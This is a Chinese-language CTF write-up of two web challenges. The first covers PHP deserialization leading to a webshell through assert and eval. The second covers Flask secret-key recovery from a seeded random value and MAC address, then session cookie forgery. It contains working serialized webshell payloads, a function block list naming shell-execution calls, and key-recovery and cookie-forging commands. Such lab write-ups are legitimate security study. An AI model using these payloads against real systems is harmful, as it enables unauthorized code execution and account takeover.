# 网鼎杯 2020 朱雀组【phpweb】
进去看到报错
![[file-20251219163414701.png]]
看到这里是调用了`data()`函数，抓包看看
![[file-20251219163619250.png]]
应该就是`func`：函数名；`p`：参数
试着`file_get_contents`读一下`index.php`
得到源码：
```php
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```
直接传参会有waf，注意到有个`__destruct`，这里也调用了`gettime`，并且没有waf；
![[file-20251219172323661.png]]
其实这里可以直接通过
`call_user_func("system","cat /flag");`这样getflag，但是这里m神让写马，上面这样能命令执行了，但是这不是一次性的吗，不太懂怎么连接的，试了文件写入，好像也没权限，本地试了一下，可以写文件，题目应该是限制了权限
```php
O:4:"Test":2:{s:1:"p";s:57:"file_put_contents('abc.php','<?=eval($_POST["cmd"]);?>');";s:4:"func";s:6:"assert";}
```
也可以像这样：
```php
<?php
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";

}

$test = new Test();


$test->func="assert";
$test->p='eval($_POST["1"]);';


echo serialize($test);
```
但是这样只有一次呀，当时可以执行，这咋连接。。。
后面了解了一下，蚁剑可以直接设置发包的参数，直接连接就好了
这里是php版本5.几，所以还可以调用`assert`，但是7版本之后assert也变成语言结构了，所以就不能写马了，
![](assets/Day%203/file-20251220014214991.png)
或者还有其他方法，以后再了解一下。

# CISCN2019 华东南赛区【Web4】
进去是一个链接，但是打不开了，（不知道为什么）但是查看源代码发现是传一个url参数，猜测是ssrf，尝试之后也没反应，也可能是文件包含，再试试，果然能读到
![600](assets/Day%203/file-20251220021309697.png)
抓包在读一下其他文件，同时也发现了存在特殊的cookie
![500](assets/Day%203/file-20251220021354705.png)
以为是jwt，尝试解码一下
![500](assets/Day%203/file-20251220021551745.png)
这看着也不是常规的jwt。这里我们也查到了当前进程存在的文件，所以直接看源码了
```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```
逻辑很简单
`/read`路由是一个urlopen输入的，这里可以理解为文件读取
`/flag`路由就是查看flag的，但是这里会检查我们的session，所以应该就是一个session伪造，刚好前两天面试也问到了flask的session，这里学习一下。
我们看到session生成规则：
```python
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True
```
这里是一个伪随机数，设置了种子的，还要了解一下`uuid.getnode()`
![](assets/Day%203/file-20251220022618712.png)
看到这里值是和mac地址有关，学了一下怎么获得mac地址
`/sys/class/net/eth0/address`
这是linux中存储mac地址的地方
![](assets/Day%203/file-20251220023000279.png)
了解了一下，flask的session是会和`secret_key`有关的，有了这个key就可以用工具直接伪造了。
这里我们直接按照逻辑得到`secret_key`
我们通过脚本可以得到mac对应的key
```python
import uuid
import random

mac = "2e:b0:8f:54:a6:f4"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*233)
print(randStr)
```
(注意这里还只有用python2跑脚本，不知道为什么，python3跑精度不一样)没有环境可以用在线网站跑
https://www.jyshare.com/compile/6/
```bash
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833'
{'username': b'www-data'}
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833095'
[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
```
我们这里需要`username=fuck`，用工具改一下：
```bash
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  encode -s '74.8534422833' -t "{'username': b'fuck'}"
eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
```
然后访问flag路由就好了，注意这里，我们伪造是只需要key的，因为后面的签名和前面有关
![500](assets/Day%203/file-20251220030430083.png)
